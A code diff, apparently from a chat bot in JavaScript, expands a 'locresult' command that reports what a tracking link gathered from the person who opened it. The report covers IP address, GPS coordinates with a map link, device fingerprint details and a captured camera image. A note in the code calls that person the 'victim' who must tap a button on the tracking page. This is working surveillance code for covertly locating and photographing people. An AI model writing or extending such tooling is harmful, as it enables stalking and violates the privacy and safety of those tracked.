@@ -13670,31 +13670,55 @@ case 'locresult': {
         if (!d || d.error) return reply(`❌ *Session not found.*\nToken galat hai ya 2 ghante se zyada purana hai.`);
 
         const _lcMet = d.metrics || {};
-        // FIX: client JS sends 'ua' (not 'userAgent'), 'tz' (not 'timeZone'),
-        // 'screen.w×h' (not 'viewport'), 'conn.type/dl' (not 'connection')
-        const _lcDevice = _lcMet.ua ? _lcMet.ua.substring(0, 80) + '…' : 'N/A';
+        const _lcDevice = _lcMet.ua ? _lcMet.ua : 'N/A';
         const _lcPlatform = _lcMet.platform || 'N/A';
         const _lcTz = _lcMet.tz || 'N/A';
         const _lcScreen = (_lcMet.screen && _lcMet.screen.w)
-            ? `${_lcMet.screen.w}×${_lcMet.screen.h}`
+            ? `${_lcMet.screen.w}×${_lcMet.screen.h} (avail: ${_lcMet.screen.aw}×${_lcMet.screen.ah}, DPR: ${_lcMet.dpr || 1})`
             : 'N/A';
         const _lcConn = (_lcMet.conn && _lcMet.conn.type)
-            ? `${_lcMet.conn.type} (${_lcMet.conn.dl} Mbps)`
+            ? `${_lcMet.conn.type} (${_lcMet.conn.dl} Mbps, RTT: ${_lcMet.conn.rtt}ms)`
             : 'N/A';
+        const _lcBattery = _lcMet.battery
+            ? `${_lcMet.battery.pct}%${_lcMet.battery.charging ? ' ⚡charging' : ''}`
+            : 'N/A';
+        const _lcCores = _lcMet.cores || 'N/A';
+        const _lcMemory = _lcMet.memory ? `${_lcMet.memory}GB` : 'N/A';
+        const _lcTouch = _lcMet.touch ? `✅ Yes (${_lcMet.touchPts || '?'} points)` : '❌ No';
+        const _lcLang = _lcMet.lang || 'N/A';
+
+        // GPS with Google Maps link
+        let _lcGps = '❌ Not captured yet';
+        let _lcGpsMap = '';
+        if (_lcMet.gps && _lcMet.gps.lat) {
+            const _lat = _lcMet.gps.lat;
+            const _lng = _lcMet.gps.lng;
+            const _acc = _lcMet.gps.acc ? `±${Math.round(_lcMet.gps.acc)}m` : '';
+            _lcGps = `${_lat}, ${_lng} ${_acc}`;
+            _lcGpsMap = `https://www.google.com/maps?q=${_lat},${_lng}`;
+        }
+
         const _lcTime = d.timestamp ? new Date(d.timestamp).toLocaleString('en-PK', { timeZone: 'Asia/Karachi' }) : 'N/A';
 
-        const _lcReport =
-            `📊 *Location Tracker — Results*\n\n` +
+        let _lcReport =
+            `📊 *Location Tracker — Detailed Results*\n\n` +
             `👤 *User ID:* ${d.userId || 'N/A'}\n` +
             `🌐 *IP Address:* ${d.ip || '⏳ Not yet visited'}\n` +
+            `📍 *GPS:* ${_lcGps}\n` +
+            (_lcGpsMap ? `🗺️ *Map:* ${_lcGpsMap}\n` : '') +
             `📱 *Device:* ${_lcDevice}\n` +
             `💻 *Platform:* ${_lcPlatform}\n` +
             `🌍 *TimeZone:* ${_lcTz}\n` +
             `📡 *Connection:* ${_lcConn}\n` +
             `🖥️ *Screen:* ${_lcScreen}\n` +
+            `🔋 *Battery:* ${_lcBattery}\n` +
+            `⚙️ *Cores:* ${_lcCores} | *RAM:* ${_lcMemory}\n` +
+            `👆 *Touch:* ${_lcTouch}\n` +
+            `🌐 *Language:* ${_lcLang}\n` +
             `📸 *Camera:* ${d.hasCamera ? '✅ Captured!' : '❌ Not captured yet'}\n` +
             `🕒 *Last Seen:* ${_lcTime}\n\n` +
-            `${d.hasCamera ? `📷 Camera image dekhne ke liye:\n*${prefix}loccam ${_lcToken}*` : ''}`;
+            `${d.hasCamera ? `📷 Camera image dekhne ke liye:\n*${prefix}loccam ${_lcToken}*\n\n` : ''}` +
+            `_Note: GPS and Camera require victim to tap the button on tracking page_`;
 
         reply(_lcReport);
 
